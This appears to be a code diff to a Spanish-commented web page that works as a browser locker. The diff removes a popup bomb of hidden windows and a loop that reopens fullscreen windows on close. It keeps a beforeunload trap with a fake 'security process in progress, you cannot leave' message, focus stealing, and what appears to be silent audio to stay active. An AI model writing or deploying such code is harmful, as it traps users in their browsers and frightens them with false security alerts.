@@ -606,18 +606,10 @@
             }
         }, { passive: false, capture: true });
 
-        // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO
+        // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO (DESACTIVADO - NO MÁS POPUPS)
         function createSystemOverride() {
-            // Crear múltiples ventanas invisibles para consumir recursos
-            for (let i = 0; i < 10; i++) {
-                try {
-                    const popup = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
-                    if (popup) {
-                        lockWindows.push(popup);
-                        popup.document.write('<script>window.onbeforeunload = function() { return false; }; setInterval(function() { window.focus(); }, 100);<\/script>');
-                    }
-                } catch (e) {}
-            }
+            // Función desactivada para evitar ventanas emergentes molestas
+            console.log('Sistema de override desactivado para mejor experiencia de usuario');
         }
 
         // Crear audio silencioso para mantener la app activa
@@ -702,25 +694,14 @@
             }, true);
         }
 
-        // Crear bucle infinito de ventanas emergentes si intenta cerrar
+        // Crear bucle infinito de ventanas emergentes si intenta cerrar (DESACTIVADO)
         function createInfiniteLoop() {
             window.addEventListener('beforeunload', function(e) {
                 if (isLocked) {
-                    // Crear nuevas ventanas para reemplazar la actual
-                    for (let i = 0; i < 5; i++) {
-                        setTimeout(() => {
-                            try {
-                                const newWindow = window.open(location.href, '_blank', 'fullscreen=yes');
-                                if (newWindow) {
-                                    newWindow.focus();
-                                }
-                            } catch (e) {}
-                        }, i * 100);
-                    }
-                    
+                    // Solo mostrar mensaje de advertencia, sin crear ventanas molestas
                     e.preventDefault();
-                    e.returnValue = 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
-                    return 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
+                    e.returnValue = 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
+                    return 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
                 }
             });
         }
@@ -734,10 +715,9 @@
                     if (!document.hasFocus()) {
                         window.focus();
                         
-                        // Crear nueva ventana si perdemos el control
+                        // Solo mantener el foco, sin crear ventanas nuevas
                         try {
-                            const backup = window.open(location.href, '_self');
-                            if (backup) backup.focus();
+                            window.focus();
                         } catch (e) {}
                     }
 
